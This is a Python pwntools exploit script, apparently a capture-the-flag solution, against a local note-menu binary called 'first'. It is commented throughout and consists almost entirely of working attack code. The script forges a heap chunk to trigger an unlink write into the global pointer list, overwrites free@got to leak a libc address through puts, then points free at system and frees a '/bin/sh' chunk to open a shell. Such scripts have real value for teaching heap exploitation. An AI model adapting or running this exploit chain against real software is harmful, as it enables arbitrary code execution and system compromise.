from pwn import *


def create(cun, size, string):
	p.recvuntil('******\n$')
	p.send('1')
	p.recvuntil('size\n')
	p.send(str(size))
	p.recvuntil('cun\n')
	p.send(str(cun))
	p.recvuntil('content\n')
	p.send(string)

def delete(index):
	p.recvuntil('******\n$')
	p.send('2')
	p.recvuntil('dele\n')
	p.send(str(index))

def edit(index, string):
	p.recvuntil('******\n$')
	p.send('3')
	p.recvuntil('edit\n')
	p.send(str(index))
	p.recvuntil('content\n')
	p.send(string)


context(os='linux',arch='amd64')
# context.log_level='debug'
elf = ELF('./first')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./first')
p.sendline('a')

# use to save two pointers in list, not fastbin
create(2, 0x100, 'a')
create(1, 0x100, 'a')

delete(2)
delete(1)

list_addr = 0x6020e0

# p_addr also set to list[4](save index2's pointer)
p_addr = list_addr + 0x18 + 0x8
# size = 0x100+0x100+0x10(chunk1 header)
# fake data(low addr --> high addr): chunk0p->(presize, size&inuse, fd, bk, data), chunk1p->(presize, size&inuse)
# keep: [1]p->fd->bk == p->bk->fd == p, [2]p->size == (p+size)->presize
create(2, 0x210, p64(0)+p64(0x101)+p64(p_addr-0x18)+p64(p_addr-0x10)+'a'*(0x100-0x20)+p64(0x100)+p64(0x210-0x100))

# when free chunk1, inuse bit is `0`, than unlink chunk0, p->fd->bk = p->bk, p->bk->fd = p->fd
# *p_addr = p->fd = p_addr-0x18 = list_addr+0x8
delete(1)

# fake data: index0_flag, index1p, index1_flag, index2p, index2_flag
edit(2, p64(0)+p64(elf.got['free'])+p64(1)+p64(elf.got['read'])+p64(1))


# change free to puts
edit(1, p64(elf.symbols['puts']))

# puts(&list[4]) == puts(free@got)
delete(2)

read_addr = u64(p.recv(6) + '\x00'*2)
system_addr = libc.symbols['system'] - libc.symbols['read'] + read_addr

# change puts to system
edit(1, p64(system_addr))

create(3, 0x20, '/bin/sh')

# system('/bin/sh')
delete(3)
p.interactive()